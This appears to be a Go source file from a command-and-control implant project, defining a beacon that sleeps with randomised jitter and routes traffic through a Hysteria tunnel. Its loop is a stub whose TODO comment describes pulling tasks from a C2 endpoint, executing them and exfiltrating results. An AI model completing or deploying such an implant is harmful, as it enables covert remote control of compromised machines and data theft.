package beacon

import (
	"h2-c2-implant/config"
	"h2-c2-implant/transport"
	"math/rand"
	"time"
)

type Beacon struct {
	tun *transport.HysteriaTunnel
	cfg *config.Config
}

func NewBeacon(tun *transport.HysteriaTunnel, cfg *config.Config) *Beacon {
	return &Beacon{tun: tun, cfg: cfg}
}

func (b *Beacon) Start() {
	for {
		jitter := rand.Intn(b.cfg.Jitter*2) - b.cfg.Jitter
		time.Sleep(time.Duration(b.cfg.BaseInterval+jitter) * time.Second)

		// TODO: Send heartbeat via tunnel, pull tasks from /api/c2/task, execute, exfil results
		// All comms forced through the Hysteria tunnel
	}
}
